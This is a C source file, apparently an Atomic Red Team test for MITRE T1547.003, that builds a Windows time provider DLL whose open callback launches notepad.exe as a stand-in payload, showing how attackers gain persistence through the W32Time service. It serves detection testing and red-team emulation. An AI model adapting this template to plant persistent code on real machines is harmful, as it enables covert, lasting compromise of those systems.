/*
   Atomic Test T1547.003
   Author: tr4cefl0w
   Credits:   https://github.com/scottlundgren/w32time
              https://pentestlab.blog/2019/10/22/persistence-time-providers/
   Resources: https://docs.microsoft.com/en-us/windows/win32/sysinfo/creating-a-time-provider
              https://docs.microsoft.com/en-us/windows/win32/sysinfo/sample-time-provider
*/


#include <windows.h>
#include "timeprov.h"

TimeProvSysCallbacks sc;
const TimeProvHandle htp = (TimeProvHandle)1;
TpcGetSamplesArgs Samples;
DWORD dwPollInterval;

void Run(void) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

	CreateProcess(
				"c:\\windows\\notepad.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&si, &pi);

}

HRESULT CALLBACK TimeProvOpen(WCHAR *wszName, TimeProvSysCallbacks *pSysCallback, TimeProvHandle *phTimeProv) {

	CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Run, 0, 0, 0);

	CopyMemory(&sc, (PVOID)pSysCallback, sizeof(TimeProvSysCallbacks));
	*phTimeProv = htp;

   return S_OK;
}

HRESULT CALLBACK TimeProvCommand(TimeProvHandle hTimeProv, TimeProvCmd eCmd, PVOID pvArgs) {
   
   switch( eCmd ) {
      case TPC_GetSamples:
      // Return the Samples structure in pvArgs.
         CopyMemory(pvArgs, &Samples, sizeof(TpcGetSamplesArgs));
         break;
      case TPC_PollIntervalChanged:
      // Retrieve the new value.
         sc.pfnGetTimeSysInfo( TSI_PollInterval, &dwPollInterval );
         break;
      case TPC_TimeJumped:
      // Discard samples saved in the Samples structure.
         ZeroMemory(&Samples, sizeof(TpcGetSamplesArgs));
         break;
      case TPC_UpdateConfig:
      // Read the configuration sirmation from the registry.
         break;
   }
   return S_OK;
}

HRESULT CALLBACK TimeProvClose(TimeProvHandle hTimeProv) {
   return S_OK;
}